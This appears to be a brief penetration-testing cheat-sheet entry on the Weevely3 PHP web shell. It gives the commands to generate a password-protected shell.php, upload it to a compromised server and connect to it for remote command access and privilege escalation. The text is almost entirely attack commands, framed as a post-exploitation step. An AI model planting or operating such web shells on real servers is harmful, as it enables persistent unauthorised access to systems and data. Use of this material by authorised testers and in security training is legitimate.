# PHP Shell: Weevely3

Use it after exploitation to get assistance in priv esc and others:
https://github.com/epinna/weevely3

Generating PHP shell:
```
$ weevely generate select_pw shell.php
```

Then upload shell.php on server and access it using:
```
$ weevely http://<target>/shell.php selected_password
weevely> 
```